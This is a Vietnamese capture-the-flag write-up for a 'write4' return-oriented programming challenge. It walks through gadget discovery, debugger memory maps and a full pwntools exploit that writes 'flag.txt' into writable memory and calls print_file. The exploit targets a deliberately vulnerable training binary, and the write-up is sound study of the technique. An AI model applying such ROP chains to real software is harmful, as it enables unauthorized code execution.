# write4 - challenge 4

[binary file and my exploit code](https://github.com/Hjn4Pwn/Pwn/tree/main/ROP/chall4_write4)


```python
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/chall4_write4$ file write4
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped
```

Ok, thì với bài này đơn giản ta có hàm printfile(), tuy nhiên chuỗi flag.txt lại không có trong binary => ta phải tự ghi vào 

Để dễ hình dung thì như này, ta phải ghi được chuỗi ***flag.txt*** vào 1 cái địa chỉ nào đấy. Sao cho khi gọi *printfile()* thì rdi, tức là thanh ghi chứa tham số thứ nhất lúc này phải chứa *địa chỉ của chuỗi flag.txt*

Do đó điều ta cần làm bây giờ là phải tìm các gadget thỏa mãn phù hợp cho yêu cầu này:

```shell
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400693 : pop rdi ; ret
0x00000000004004e6 : ret

```

Có lẽ tất cả đã đầy đủ.

lệnh mov ở trên sẽ mov giá trị tại thanh ghi *r15* vào địa chỉ mà thanh ghi *r14* trỏ đến. Tức là r14 = 0xabc, r15 = 0xFF, thì tại địa chỉ 0xabc này sẽ lưu giá trị 0xFF

Thì đầu tiên ta sẽ *pop* r14 chứa địa chỉ ta chỉ định để lưu chuỗi **"flag.txt"** và *pop* r15 chứa chuỗi **"flag.txt"**. Sau đó thì dùng lệnh *mov* để ghi chuỗi vào địa chỉ chỉ định 

Tiếp đến thì *pop rdi* như ta đã từng làm với các chall trước.

À mà ta cần tìm địa chỉ hàm *print_file()*, và xác định địa chỉ ghi chuỗi:

```shell
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
```

```python

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r-xp     1000      0 /mnt/d/pwn_myself/ROP/chall4_write4/write4
          0x600000           0x601000 r--p     1000      0 /mnt/d/pwn_myself/ROP/chall4_write4/write4
          0x601000           0x602000 rw-p     1000   1000 /mnt/d/pwn_myself/ROP/chall4_write4/write4
    0x7ffff79d8000     0x7ffff7a00000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7a00000     0x7ffff7b95000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7b95000     0x7ffff7bed000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7bed000     0x7ffff7bf1000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7bf1000     0x7ffff7bf3000 rw-p     2000 218000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7bf3000     0x7ffff7c00000 rw-p     d000      0 [anon_7ffff7bf3]
    0x7ffff7c00000     0x7ffff7c01000 r-xp     1000      0 /mnt/d/pwn_myself/ROP/chall4_write4/libwrite4.so
    0x7ffff7c01000     0x7ffff7e00000 ---p   1ff000   1000 /mnt/d/pwn_myself/ROP/chall4_write4/libwrite4.so
    0x7ffff7e00000     0x7ffff7e01000 r--p     1000      0 /mnt/d/pwn_myself/ROP/chall4_write4/libwrite4.so
    0x7ffff7e01000     0x7ffff7e02000 rw-p     1000   1000 /mnt/d/pwn_myself/ROP/chall4_write4/libwrite4.so
    0x7ffff7fb3000     0x7ffff7fb6000 rw-p     3000      0 [anon_7ffff7fb3]
    0x7ffff7fbc000     0x7ffff7fbe000 rw-p     2000      0 [anon_7ffff7fbc]
    0x7ffff7fbe000     0x7ffff7fc2000 r--p     4000      0 [vvar]
    0x7ffff7fc2000     0x7ffff7fc3000 r-xp     1000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]

```
```python
pwndbg> x/100s 0x601000
0x601000:       ""
0x601001:       "\016`"
0x601004:       ""
0x601005:       ""
0x601006:       ""
0x601007:       ""
0x601008:       "\340\342\377\367\377\177"
0x60100f:       ""
0x601010:       "0\215\375\367\377\177"
0x601017:       ""
0x601018 <pwnme@got.plt>:       "\006\005@"
0x60101c <pwnme@got.plt+4>:     ""
0x60101d <pwnme@got.plt+5>:     ""
0x60101e <pwnme@got.plt+6>:     ""
0x60101f <pwnme@got.plt+7>:     ""
0x601020 <print_file@got.plt>:  "\026\005@"
0x601024 <print_file@got.plt+4>:        ""
0x601025 <print_file@got.plt+5>:        ""
0x601026 <print_file@got.plt+6>:        ""
0x601027 <print_file@got.plt+7>:        ""
0x601028:       ""
0x601029:       ""
0x60102a:       ""
0x60102b:       ""
0x60102c:       ""
0x60102d:       ""
0x60102e:       ""
0x60102f:       ""
0x601030:       ""
0x601031:       ""
0x601032:       ""
0x601033:       ""
0x601034:       ""
0x601035:       ""
0x601036:       ""
0x601037:       ""
0x601038 <completed.7698>:      ""
0x601039:       ""
0x60103a:       ""
0x60103b:       ""
0x60103c:       ""
0x60103d:       ""
0x60103e:       ""
0x60103f:       ""
0x601040:       ""
0x601041:       ""
0x601042:       ""
0x601043:       ""
0x601044:       ""
0x601045:       ""
0x601046:       ""
0x601047:       ""
0x601048:       ""
```

Để tránh việc ghi đè lên giá trị đã có sẵn 1 cách không mong muốn nên ta sẽ chọn địa chỉ **0x601040**

### Exploit

```python
from pwn import *

r = process("./write4")
#gdb.attach(r, api= True)

print_file = 0x0000000000400510
pop_rdi_ret = 0x0000000000400693
ret = 0x00000000004004e6
pop_r14_r15 = 0x0000000000400690
mov_r14add_r15 = 0x0000000000400628

r14_address_store_flag = 0x601040
r15_flag = b'flag.txt'


payload = b'A'*40 + p64(ret)
#r14 => address, r15 => flag
payload += p64(pop_r14_r15) + p64(r14_address_store_flag) + r15_flag
# r14 -> address -> r15 (flag)
payload += p64(mov_r14add_r15) 
# rdi = r14 = address string flag.txt
payload += p64(pop_rdi_ret)
payload += p64(r14_address_store_flag)

payload += p64(print_file)

r.sendline(payload)
r.interactive()

```
